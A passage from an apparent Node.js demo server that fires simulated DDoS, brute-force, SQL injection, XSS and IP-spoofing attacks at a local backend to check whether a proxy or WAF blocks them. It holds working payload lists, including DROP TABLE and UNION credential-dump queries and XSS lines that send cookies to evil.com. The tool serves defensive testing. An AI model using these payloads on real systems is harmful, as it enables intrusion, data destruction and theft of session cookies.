  document.querySelectorAll('.atk-btn').forEach(b => b.classList.remove('running'));
  running = false;
}
</script>
</body>
</html>`;
}

// ── HTTP Server ───────────────────────────────────────────────────────────────
const server = http.createServer(async (req, res) => {
  const parsed = url.parse(req.url, true);

  res.setHeader('Access-Control-Allow-Origin', '*');

  if (req.method === 'OPTIONS') { res.writeHead(204); return res.end(); }

  if (parsed.pathname === '/' || parsed.pathname === '/demo') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(demoHTML());
  }

  // Attack runner endpoint (called by the demo UI JS)
  if (parsed.pathname === '/run-attack' && req.method === 'POST') {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', async () => {
      const { type, useProxy } = JSON.parse(body);
      // Temporarily override which port attacks target
      const origPort = PROXY_PORT;
      const targetPort = useProxy ? PROXY_PORT : BACKEND_PORT;

      // Monkey-patch makeReq for this call
      const results = await runAttackOn(type, targetPort);

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(results));
    });
    return;
  }

  res.writeHead(404); res.end('Not found');
});

// makeReq with dynamic port
function makeReqOn(port, opts) {
  return makeReq({ ...opts, port });
}

async function runAttackOn(type, targetPort) {
  const log = [];
  const add = (emoji, label, status, note, blocked) =>
    log.push({ emoji, label, status, note, blocked, ts: Date.now() });

  // Port-aware request builder
  const portedReq = (opts) => makeReqOn(targetPort, opts);
const makeReq = portedReq;  

  // ── Shared helpers (used by multiple attack types) ──
  const jitter = (min, max) => new Promise(res =>
    setTimeout(res, min + Math.random() * (max - min))
  );

  const chunk = (arr, size) =>
    Array.from({ length: Math.ceil(arr.length / size) }, (_, i) =>
      arr.slice(i * size, i * size + size)
    );

  // ════════════════════════════════════════════
  // DDoS
  // ════════════════════════════════════════════
  if (type === 'ddos') {
    const TOTAL = 200, CONCURRENCY = 20;
    const PATHS = ['/getAllUsers', '/getUser/1', '/api/data', '/admin/stats'];

    const requests = Array.from({ length: TOTAL }, (_, i) => ({
      index: i + 1,
      path:  PATHS[i % PATHS.length],
      delay: Math.floor(i / CONCURRENCY) * 10,
    }));

    const results = [];

    for (const batch of chunk(requests, CONCURRENCY)) {
      const batchResults = await Promise.allSettled(
        batch.map(({ index, path, delay }) =>
          new Promise(res => setTimeout(res, delay))
            .then(() => makeReq({ path }))
            .then(r => {
              const blocked = r.status === 429;
              add(blocked ? '⚡' : '✓',
                `Request #${index} → ${path}`, r.status,
                blocked ? 'Rate limit triggered' : 'Request passed through', blocked);
              return { index, path, status: r.status, blocked, ts: Date.now() };
            })
            .catch(err => {
              add('✗', `Request #${index} → ${path}`, 0, err.message || 'Network error', false);
              return { index, path, status: 0, blocked: false, ts: Date.now() };
            })
        )
      );
      batchResults.forEach(r => { if (r.status === 'fulfilled') results.push(r.value); });
    }

    log.sort((a, b) => a.ts - b.ts);
  }

  // ════════════════════════════════════════════
  // Brute Force
  // ════════════════════════════════════════════
  else if (type === 'bruteforce') {
    const CONFIG = { delay: { min: 50, max: 200 }, concurrency: 3, lockoutThreshold: 3 };

    const ALL_PASSWORDS = [
      'password','123456','admin','letmein','qwerty','monkey','iloveyou','dragon',
      'admin123','password1','pass@123','abc@1234','Admin@1','P@ssw0rd',
      'admin@2024','gateway123','proxy@admin','apigate','reverseproxy',
    ];
    const USERNAMES = ['admin', 'administrator', 'root', 'superuser', 'api_admin'];
    const lockoutCount = Object.fromEntries(USERNAMES.map(u => [u, 0]));
    const skipped = [], results = [];
    let attemptNumber = 0;

    const attempts = ALL_PASSWORDS.flatMap(pwd => USERNAMES.map(usr => ({ username: usr, password: pwd })));

    for (const batch of chunk(attempts, CONFIG.concurrency)) {
      const batchPromises = batch.map(async ({ username, password }) => {
        attemptNumber++;

        if (lockoutCount[username] >= CONFIG.lockoutThreshold) {
          skipped.push({ username, password });
          add('⏭', `Skipped #${attemptNumber} — ${username}:"${password}"`, '—', 'Username locked out', false);
          return;
        }

        await jitter(CONFIG.delay.min, CONFIG.delay.max);

        let r;
        try {
          r = await makeReq({
            method: 'POST', path: '/login',
            body: { username, password },
            headers: { 'User-Agent': ['Mozilla/5.0','curl/7.68.0','python-requests/2.28','Hydra/9.4'][attemptNumber % 4] },
          });
        } catch (err) {
          add('✗', `Error #${attemptNumber} — ${username}:"${password}"`, 0, err.message, false);
          return;
        }

        const isBlocked = r.status === 429;
        const isWrong   = r.status === 401;
        const isSuccess = r.status === 200 || r.status === 204;

        if (isBlocked) lockoutCount[username]++;
        else lockoutCount[username] = 0;

        const icon = isBlocked ? '⚡' : isWrong ? '🔒' : isSuccess ? '🚨' : '✗';
        const note = isBlocked ? 'BLOCKED: Brute force detected'
                   : isWrong   ? 'Wrong password — reached backend'
                   : isSuccess ? `SUCCESS: ${username}/${password}`
                   :             `Unexpected status ${r.status}`;

        add(icon, `Attempt #${attemptNumber} — ${username}:"${password}"`, r.status, note, isBlocked);
        results.push({ attemptNumber, username, password, status: r.status, isBlocked, isWrong, isSuccess, ts: Date.now() });

        if (isSuccess) return 'FOUND';
      });

      const batchResults = await Promise.allSettled(batchPromises);
      if (batchResults.some(r => r.value === 'FOUND')) break;
    }

    log.sort((a, b) => a.ts - b.ts);
  }

  // ════════════════════════════════════════════
  // SQL Injection
  // ════════════════════════════════════════════
  else if (type === 'sqlinject') {
    const CONFIG = { delay: { min: 60, max: 200 }, concurrency: 2 };

    const PAYLOADS = {
      classic: [
        { path: '/getAllUsers?id=1 OR 1=1',           label: 'OR 1=1 bypass'         },
        { path: '/getAllUsers?id=1 OR 1=1--',          label: 'OR 1=1 with comment'   },
        { path: "/getAllUsers?id=1 OR '1'='1'",        label: 'String OR bypass'      },
        { path: '/getAllUsers?id=0 OR 1=1#',           label: 'MySQL hash comment'    },
      ],
      union: [
        { path: "/search?name=admin' UNION SELECT NULL--",                       label: 'UNION NULL probe'       },
        { path: "/search?name=1' UNION SELECT username,password FROM users--",   label: 'UNION credential dump'  },
        { path: '/api?q=1 UNION SELECT table_name FROM information_schema.tables--', label: 'Schema enumeration' },
      ],
      destructive: [
        { path: "/getAllUsers?q='; DROP TABLE users;--",       label: 'DROP TABLE'           },
        { path: '/api?filter=1; DELETE FROM orders--',         label: 'DELETE rows'          },
        { path: "/api?id=1; UPDATE users SET role='admin'--",  label: 'Privilege escalation' },
      ],
      blind: [
        { path: '/getAllUsers?id=1 AND SLEEP(5)',               label: 'MySQL time-based blind'  },
        { path: "/api?id=1; WAITFOR DELAY '0:0:5'--",          label: 'MSSQL time-based blind'  },
      ],
      encodingEvasion: [
        { path: '/getAllUsers?id=1%20OR%201%3D1',              label: 'URL-encoded OR 1=1'     },
        { path: '/getAllUsers?id=1/**/OR/**/1=1',              label: 'Comment-obfuscated OR'  },
      ],
      postBody: [
        { path: '/login',    label: 'SQLi in username field', method: 'POST', body: { username: "admin'--",       password: 'x'             } },
        { path: '/login',    label: 'OR bypass in body',      method: 'POST', body: { username: "' OR '1'='1",    password: "' OR '1'='1"   } },
        { path: '/api/data', label: 'JSON body SQLi',         method: 'POST', body: { filter: "1; DROP TABLE sessions--", page: 1          } },
      ],
    };

    const ALL_PAYLOADS = Object.entries(PAYLOADS).flatMap(([category, items]) =>
      items.map(p => ({ method: 'GET', body: null, ...p, category }))
    );

    const classify = (status, responseTime) => {
      if (status === 400 || status === 403) return { icon: '🛡', verdict: 'BLOCKED by WAF',            critical: false };
      if (status === 500)                   return { icon: '💥', verdict: 'SERVER ERROR — likely leak', critical: true  };
      if (status === 200 && responseTime > 4000) return { icon: '⏱', verdict: 'TIME-BASED BLIND HIT',  critical: true  };
      if (status === 200)                   return { icon: '⚠️', verdict: 'REACHED BACKEND!',           critical: true  };
      if (status === 401 || status === 404) return { icon: '🔒', verdict: 'Auth/Not found — low risk',  critical: false };
      return                                       { icon: '❓', verdict: `Unexpected: ${status}`,      critical: false };
    };

    let attemptNum = 0;

    for (const batch of chunk(ALL_PAYLOADS, CONFIG.concurrency)) {
      await Promise.allSettled(
        batch.map(async ({ path, label, method, body, category }) => {
          attemptNum++;
          await jitter(CONFIG.delay.min, CONFIG.delay.max);

          const t0 = Date.now();
          let r;
          try {
            r = await makeReq({
              method, path, body,
              headers: {
                'X-Forwarded-For': `10.0.0.${Math.floor(Math.random() * 254) + 1}`,
                'User-Agent': ['sqlmap/1.7', 'Mozilla/5.0', 'curl/7.88'][attemptNum % 3],
              },
            });
          } catch (err) {
            add('✗', `[${category}] #${attemptNum} ${label}`, 0, `Network error: ${err.message}`, false);
            return;
          }

          const responseTime = Date.now() - t0;
          const { icon, verdict, critical } = classify(r.status, responseTime);

          add(icon,
            `[${category.toUpperCase()}] #${attemptNum} — ${label}`,
            `${r.status} (${responseTime}ms)`,
            verdict,
            !critical
          );
        })
      );
    }

    log.sort((a, b) => a.ts - b.ts);
  }

  // ════════════════════════════════════════════
  // XSS
  // ════════════════════════════════════════════
  else if (type === 'xss') {
    const CONFIG = { delay: { min: 50, max: 180 }, concurrency: 3 };

    const PAYLOADS = {
      scriptTag: [
        { path: '/search?q=<script>alert(document.cookie)</script>', label: 'Basic script + cookie theft' },
        { path: '/search?q=<SCRIPT>alert(1)</SCRIPT>',               label: 'Uppercase tag evasion'       },
        { path: '/search?q=<script/src=//evil.com/xss.js>',          label: 'Remote script load'          },
      ],
      eventHandlers: [
        { path: '/search?q="><img src=x onerror=alert(1)>',          label: 'onerror on broken image'     },
        { path: '/search?q="><input autofocus onfocus=alert(1)>',     label: 'onfocus autofocus'           },
        { path: '/search?q="><details open ontoggle=alert(1)>',       label: 'details ontoggle'            },
      ],
      uriSchemes: [
        { path: '/page?url=javascript:alert(document.cookie)',        label: 'javascript: URI scheme'      },
        { path: '/page?url=data:text/html,<script>alert(1)</script>', label: 'data: URI with script'       },
      ],
      encodingEvasion: [
        { path: '/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E',     label: 'URL-encoded script tag'      },
        { path: '/search?q=&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', label: 'HTML entity encoded'  },
        { path: '/api?cb=eval(atob("YWxlcnQoMSk="))',                 label: 'eval(atob()) base64'         },
      ],
      svgAndMath: [
        { path: '/search?q="><svg onload=fetch(`//evil.com?c=${document.cookie})>', label: 'SVG onload exfil'     },
        { path: '/search?q=<svg><animate onbegin=alert(1) attributeName=x>',        label: 'SVG animate onbegin'  },
        { path: '/search?q=<math><mtext></p><script>alert(1)</script>',              label: 'MathML namespace confusion' },
      ],
      postBody: [
        { path: '/comment',  label: 'onerror in comment body', method: 'POST', body: { text: '<img src=x onerror=alert(1)>'                            } },
        { path: '/comment',  label: 'Stored script tag',       method: 'POST', body: { text: '<script>document.location="//evil.com?c="+document.cookie</script>' } },
        { path: '/profile',  label: 'XSS in display name',     method: 'POST', body: { name: '"><script>alert(1)</script>'                             } },
        { path: '/feedback', label: 'Polyglot XSS payload',    method: 'POST', body: { message: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//</stYle/</titLe/</scRipt/--!>\\x3csVg/oNloAd=alert(1)//>\\x3e' } },
      ],
    };

    const ALL_PAYLOADS = Object.entries(PAYLOADS).flatMap(([category, items]) =>
      items.map(p => ({ method: 'GET', body: null, ...p, category }))
    );

    const classify = (status, responseText = '') => {
      const echoed = responseText && (
        responseText.includes('<script') ||
        responseText.includes('onerror') ||
        responseText.includes('onload')
      );
      if (status === 400 || status === 403) return { icon: '🛡', verdict: 'BLOCKED by WAF',                   critical: false };
      if (echoed)                           return { icon: '🚨', verdict: 'REFLECTED — payload echoed back!', critical: true  };
      if (status === 500)                   return { icon: '💥', verdict: 'SERVER ERROR',                     critical: true  };
      if (status === 200)                   return { icon: '⚠️', verdict: 'REACHED BACKEND — inspect!',       critical: true  };
      if (status === 301 || status === 302) return { icon: '↪️', verdict: 'Redirect — check Location header', critical: false };
      if (status === 404 || status === 401) return { icon: '🔒', verdict: 'Auth/Not found — low risk',        critical: false };
      return                                       { icon: '❓', verdict: `Unexpected: ${status}`,            critical: false };
    };

    let attemptNum = 0;

    for (const batch of chunk(ALL_PAYLOADS, CONFIG.concurrency)) {
      await Promise.allSettled(
        batch.map(async ({ path, label, method, body, category }) => {
          attemptNum++;
          await jitter(CONFIG.delay.min, CONFIG.delay.max);

          let r, responseText = '';
          try {
            r = await makeReq({
              method, path, body,
              headers: {
                'User-Agent':      ['Mozilla/5.0', 'curl/7.88', 'python-requests/2.28'][attemptNum % 3],
                'X-Forwarded-For': `10.0.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
                'Referer':         `https://evil.com/xss-${attemptNum}`,
                'Accept':          'text/html,application/xhtml+xml',
              },
            });
            try { responseText = typeof r.body === 'string' ? r.body : JSON.stringify(r.body || ''); } catch (_) {}
          } catch (err) {
            add('✗', `[${category}] #${attemptNum} — ${label}`, 0, `Network error: ${err.message}`, false);
            return;
          }

          const { icon, verdict, critical } = classify(r.status, responseText);

          add(icon,
            `[${category.toUpperCase()}] #${attemptNum} — ${label}`,
            `${r.status}`,
            verdict,
            !critical
          );
        })
      );
    }

    log.sort((a, b) => a.ts - b.ts);
  }

  // ════════════════════════════════════════════
  // IP Blacklist
  // ════════════════════════════════════════════
  else if (type === 'blacklist') {
    const CONFIG = { delay: { min: 80, max: 250 }, concurrency: 4 };

    const IP_LIST = {
      knownAttackers: [
        { ip: '203.0.113.42',  label: 'Known attacker IP'        },
        { ip: '203.0.113.99',  label: 'Same /24 block'           },
        { ip: '198.51.100.1',  label: 'Banned bot network'       },
        { ip: '192.0.2.1',     label: 'Blacklisted TEST-NET-1'   },
      ],
      torAndProxy: [
        { ip: '185.220.101.1',  label: 'Tor exit node'           },
        { ip: '104.244.72.1',   label: 'Known VPN provider'      },
        { ip: '45.142.212.10',  label: 'Datacenter proxy'        },
      ],
      cidrBlock: [
        { ip: '203.0.113.0',   label: 'CIDR /24 base'           },
        { ip: '203.0.113.128', label: 'CIDR /24 mid'            },
        { ip: '203.0.113.255', label: 'CIDR /24 broadcast'      },
      ],
      allowlisted: [
        { ip: '1.2.3.4',       label: 'Clean residential IP'     },
        { ip: '8.8.8.8',       label: 'Google DNS — clean'       },
        { ip: '1.1.1.1',       label: 'Cloudflare DNS — clean'   },
      ],
      internal: [
        { ip: '10.0.0.5',      label: 'Internal RFC1918'         },
        { ip: '192.168.1.1',   label: 'LAN gateway'              },
        { ip: '127.0.0.1',     label: 'Loopback'                 },
      ],
      spoofingAttempts: [
        { ip: '203.0.113.42', label: 'Blacklisted — X-Forwarded-For',  headerKey: 'X-Forwarded-For'  },
        { ip: '203.0.113.42', label: 'Blacklisted — X-Real-IP',        headerKey: 'X-Real-IP'        },
        { ip: '203.0.113.42', label: 'Blacklisted — CF-Connecting-IP', headerKey: 'CF-Connecting-IP' },
        { ip: '203.0.113.42', label: 'Blacklisted — True-Client-IP',   headerKey: 'True-Client-IP'   },
      ],
      chaining: [
        { ip: '203.0.113.42', label: 'Chain: blacklisted,clean', headerKey: 'X-Forwarded-For', chainWith: '1.2.3.4'      },
        { ip: '1.2.3.4',      label: 'Chain: clean,blacklisted', headerKey: 'X-Forwarded-For', chainWith: '203.0.113.42' },
      ],
    };

    const ENDPOINTS = ['/getAllUsers', '/admin/stats', '/api/data', '/login'];

    const shouldBeBlocked = cat =>
      ['knownAttackers','torAndProxy','cidrBlock','spoofingAttempts','chaining'].includes(cat);

    const classify = (status, category) => {
      const expectBlock = shouldBeBlocked(category);
      if (status === 403 || status === 429)
        return expectBlock
          ? { icon: '⛔', verdict: 'BLOCKED — correct',              critical: false }
          : { icon: '⚠️', verdict: 'FALSE POSITIVE — clean blocked', critical: false };
      if (status === 200 || status === 204)
        return expectBlock
          ? { icon: '🚨', verdict: 'BYPASS — blacklisted IP passed!', critical: true  }
          : { icon: '✅', verdict: 'ALLOWED — correct',               critical: false };
      if (status === 401 || status === 404)
        return expectBlock
          ? { icon: '⚠️', verdict: 'Not explicitly blocked',         critical: false }
          : { icon: '✅', verdict: 'Reached app layer — correct',     critical: false };
      return { icon: '❓', verdict: `Unexpected: ${status}`, critical: false };
    };

    const ALL_ATTEMPTS = Object.entries(IP_LIST).flatMap(([category, items]) =>
      items.flatMap(({ ip, label, headerKey = 'X-Forwarded-For', chainWith = null }) =>
        ENDPOINTS.map(endpoint => ({ category, ip, label, endpoint, headerKey, chainWith }))
      )
    );

    let attemptNum = 0;

    for (const batch of chunk(ALL_ATTEMPTS, CONFIG.concurrency)) {
      await Promise.allSettled(
        batch.map(async ({ category, ip, label, endpoint, headerKey, chainWith }) => {
          attemptNum++;
          await jitter(CONFIG.delay.min, CONFIG.delay.max);

          const ipHeaderValue = chainWith ? `${ip}, ${chainWith}` : ip;
          let r;
          try {
            r = await makeReq({
              path: endpoint,
              spoofIP: ip,
              headers: {
                [headerKey]:       ipHeaderValue,
                'X-Forwarded-For': ipHeaderValue,
                'User-Agent':      'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
                'Accept':          'application/json',
              },
            });
          } catch (err) {
            add('✗', `[${category}] #${attemptNum} — ${label} → ${endpoint}`, 0, `Network error: ${err.message}`, false);
            return;
          }

          const { icon, verdict, critical } = classify(r.status, category);

          add(icon,
            `[${category.toUpperCase()}] #${attemptNum} — ${label} → ${endpoint}`,
            r.status,
            verdict,
            !critical && !shouldBeBlocked(category) === false
          );
        })
      );
    }

    log.sort((a, b) => a.ts - b.ts);
  }

  // ════════════════════════════════════════════
  // Legit Traffic
  // ════════════════════════════════════════════
  else if (type === 'legit') {
    const CONFIG = {
      delay:     { min: 30, max: 120 },
      retryDelay: 400,
      authToken: null,
      sessionId: `sess_${Date.now()}`,
    };

    const withRetry = async (fn, retries = 2) => {
      for (let i = 1; i <= retries + 1; i++) {
        try {
          const r = await fn();
          if (![502, 503, 504].includes(r?.status) || i > retries) return r;
          await new Promise(res => setTimeout(res, CONFIG.retryDelay * i));
        } catch (err) {
          if (i > retries) throw err;
          await new Promise(res => setTimeout(res, CONFIG.retryDelay * i));
        }
      }
    };

    const classify = (status, expected = [200]) => {
      if (expected.includes(status))        return { icon: '✅', label: 'OK'           };
      if (status === 401 || status === 403) return { icon: '🔐', label: 'Auth failure' };
      if (status === 404)                   return { icon: '🔍', label: 'Not found'    };
      if (status === 429)                   return { icon: '⚡', label: 'Rate limited' };
      if (status >= 500)                    return { icon: '💥', label: 'Server error' };
      return                                       { icon: '❓', label: `Status ${status}` };
    };

    const req = (opts) => makeReq({
      ...opts,
      headers: {
        'User-Agent':   'MyApp/2.1 (production-client)',
        'X-Session-ID': CONFIG.sessionId,
        'X-Request-ID': `req_${Math.random().toString(36).slice(2, 10)}`,
        ...(CONFIG.authToken ? { 'Authorization': `Bearer ${CONFIG.authToken}` } : {}),
        ...(opts.headers || {}),
      },
    });

    let stepNum = 0;
    const run = async ({ label, fn, expected = [200] }) => {
      stepNum++;
      await jitter(CONFIG.delay.min, CONFIG.delay.max);
      const t0 = Date.now();
      let r;
      try { r = await withRetry(fn); }
      catch (err) { add('✗', `#${stepNum} ${label}`, 0, `Network error: ${err.message}`, false); return null; }
      const responseTime = Date.now() - t0;
      const { icon, label: riskLabel } = classify(r.status, expected);
      const note = r.body && typeof r.body === 'object'
        ? Object.entries(r.body).slice(0, 3).map(([k, v]) => `${k}: ${Array.isArray(v) ? v.length + ' items' : v}`).join(' | ')
        : riskLabel;
      add(icon, `#${stepNum} ${label}`, `${r.status} (${responseTime}ms)`, note, false);
      return r;
    };

    // Phase 1 — Infrastructure (parallel)
    await Promise.allSettled([
      run({ label: 'Health check — /health',      fn: () => req({ path: '/health'  }) }),
      run({ label: 'Readiness probe — /ready',    expected: [200,204], fn: () => req({ path: '/ready'   }) }),
      run({ label: 'Liveness probe — /live',      expected: [200,204], fn: () => req({ path: '/live'    }) }),
      run({ label: 'Version info — /version',     fn: () => req({ path: '/version' }) }),
    ]);

    // Phase 2 — Auth (sequential)
    await jitter(CONFIG.delay.min, CONFIG.delay.max);
    await run({ label: 'POST /login — wrong password (expect 401)', expected: [401],
      fn: () => req({ method: 'POST', path: '/login', body: { username: 'admin', password: 'wrongpassword' } }) });

    await jitter(CONFIG.delay.min, CONFIG.delay.max);
    const loginRes = await run({ label: 'POST /login — correct credentials', expected: [200],
      fn: () => req({ method: 'POST', path: '/login', body: { username: 'admin', password: 'secret123' } }) });

    if (loginRes?.body?.token) {
      CONFIG.authToken = loginRes.body.token;
      add('🔑', 'Auth token captured', '—', `Token: ${CONFIG.authToken.slice(0, 16)}…`, false);
    }

    // Phase 3 — Authenticated reads (parallel)
    await Promise.allSettled([
      run({ label: 'GET /getAllUsers',         fn: () => req({ path: '/getAllUsers'      }) }),
      run({ label: 'GET /stats',               fn: () => req({ path: '/stats'           }) }),
      run({ label: 'GET /admin/dashboard',     expected: [200,403], fn: () => req({ path: '/admin/dashboard' }) }),
      run({ label: 'GET /metrics',             expected: [200,403,404], fn: () => req({ path: '/metrics'     }) }),
    ]);

    // Phase 4 — Write ops (sequential)
    await jitter(CONFIG.delay.min, CONFIG.delay.max);
    const newUser = { username: `testuser_${Date.now()}`, email: `test_${Date.now()}@test.com`, role: 'viewer' };
    const createRes = await run({ label: 'POST /users — create test user', expected: [200,201],
      fn: () => req({ method: 'POST', path: '/users', body: newUser }) });

    const createdId = createRes?.body?.id || createRes?.body?.userId || null;
    if (createdId) {
      await jitter(CONFIG.delay.min, CONFIG.delay.max);
      await run({ label: `GET /users/${createdId}`,   fn: () => req({ path: `/users/${createdId}` }) });
      await jitter(CONFIG.delay.min, CONFIG.delay.max);
      await run({ label: `PATCH /users/${createdId}`, expected: [200,204],
        fn: () => req({ method: 'PATCH', path: `/users/${createdId}`, body: { role: 'editor' } }) });
      await jitter(CONFIG.delay.min, CONFIG.delay.max);
      await run({ label: `DELETE /users/${createdId}`, expected: [200,204],
        fn: () => req({ method: 'DELETE', path: `/users/${createdId}` }) });
    }

    // Phase 5 — Edge cases (parallel)
    await Promise.allSettled([
      run({ label: 'GET /nonexistent — 404 handling',      expected: [404],     fn: () => req({ path: '/nonexistent-route-xyz' }) }),
      run({ label: 'OPTIONS /getAllUsers — CORS preflight', expected: [200,204], fn: () => req({ method: 'OPTIONS', path: '/getAllUsers',
        headers: { 'Origin': 'https://myfrontend.com', 'Access-Control-Request-Method': 'GET' } }) }),
      run({ label: 'HEAD /health — HEAD method support',   expected: [200],     fn: () => req({ method: 'HEAD', path: '/health' }) }),
    ]);

    // Phase 6 — Logout + verify
    await jitter(CONFIG.delay.min, CONFIG.delay.max);
    await run({ label: 'POST /logout', expected: [200,204],
      fn: () => req({ method: 'POST', path: '/logout', body: { token: CONFIG.authToken } }) });
    await jitter(CONFIG.delay.min, CONFIG.delay.max);
    await run({ label: 'GET /getAllUsers — post-logout (expect 401)', expected: [401,403],
      fn: () => makeReq({ path: '/getAllUsers' }) });
  }

  return log;
}

server.listen(DEMO_PORT, () => {
  console.log('');
  console.log('║http://localhost:3000║');
  console.log('');
});